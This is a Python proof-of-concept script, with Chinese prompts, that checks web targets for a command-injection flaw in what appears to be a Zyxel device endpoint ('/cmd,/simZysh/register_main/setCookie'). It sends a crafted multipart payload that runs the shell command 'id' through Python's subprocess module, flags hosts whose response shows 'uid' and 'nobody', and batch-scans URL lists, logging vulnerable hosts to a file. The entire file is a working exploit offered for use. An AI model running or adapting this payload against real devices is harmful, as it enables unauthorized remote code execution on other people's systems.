import requests
import sys
import argparse

def checkVuln(url):
    okurl = url+'/cmd,/simZysh/register_main/setCookie'
    data = '''----------------------------0987654321\r\nContent-Disposition: form-data; name="c0"\r\n\r\nstorage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("id", shell=True)#\r\n----------------------------0987654321--'''
    headers = {
        'Content-Type': 'multipart/form-data; boundary=--------------------------0987654321',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0 ldwk'
    }
    try:
        res = requests.post(okurl, data=data, headers=headers, timeout=10, verify=False)
        if res.status_code == 200 and 'uid' in res.text and 'nobody' in res.text:
            with open("vul2.txt","a+") as f:
                f.write(okurl+"\n")
            print(f"[+]当前网址存在漏洞:{url}")
        else:
            print(f"[-]当前网址不存在漏洞")
    except Exception as e:
        print("[-]当前网址存在通信错误")
def banner():
    bannerinfo='''_________ _______  _______  _        _______  _______  _______
\__   __/(  ___  )(  ___  )( \      (  ____ )(  ___  )(  ____ \
   ) (   | (   ) || (   ) || (      | (    )|| (   ) || (    \/
   | |   | |   | || |   | || |      | (____)|| |   | || |
   | |   | |   | || |   | || |      |  _____)| |   | || |
   | |   | |   | || |   | || |      | (      | |   | || |
   | |   | (___) || (___) || (____/\| )      | (___) || (____/\
   )_(   (_______)(_______)(_______/|/       (_______)(_______/


'''
    print(bannerinfo)
    print("toolpoc".center(50,'*'))
    print(f"[+]{sys.argv[0]} --url http://www.xxx.com 进行单个url漏洞检测")
    print(f"[+]{sys.argv[0]} --file targeturl.txt 对文本中的url进行批量检测")
    print(f"[+]{sys.argv[0]} --help 查看帮助")
def batchCheck(filename):
    with open(filename,"r") as f:
        for readline in f.readlines():
            url=readline.replace('\n','')
            checkVuln(url)
def main():
    parser=argparse.ArgumentParser(description='漏洞检测脚本')
    parser.add_argument('-u','--url',type=str,help='单个url')
    parser.add_argument('-f','--file',type=str,help='批量检测url')
    args=parser.parse_args()
    if args.url:
        checkVuln(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()
if __name__ == '__main__':
    main()